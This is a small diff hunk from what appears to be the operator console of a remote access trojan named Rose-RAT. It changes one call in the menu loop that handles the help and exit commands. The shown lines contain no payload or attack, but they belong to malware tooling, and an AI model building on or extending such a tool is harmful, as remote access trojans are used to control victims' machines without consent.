@@ -77,7 +77,7 @@ class Serv():
             cmd = Write.Input("\n    .$ ", Colors.red_to_white, interval=0.025)
             if cmd == "help":
                 webbrowser.open("https://github.com/DamagingRose/Rose-RAT")
-                self.home(self._connected.get())
+                self.home()
                 
             elif cmd == "exit":
                 exit()
